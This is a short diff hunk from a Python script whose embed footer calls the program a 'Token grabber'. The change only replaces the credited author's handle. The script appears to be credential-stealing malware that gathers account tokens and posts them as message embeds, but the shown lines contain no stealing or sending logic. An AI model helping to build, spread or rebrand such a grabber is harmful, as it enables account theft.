@@ -176,7 +176,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by !!. 𝙒 𝙖 𝙡 𝙡 𝙖 𝙭#2944"
+                    "text": f"Token grabber by GSinister. ♣#0009"
                 }
             }
             embeds.append(embed)
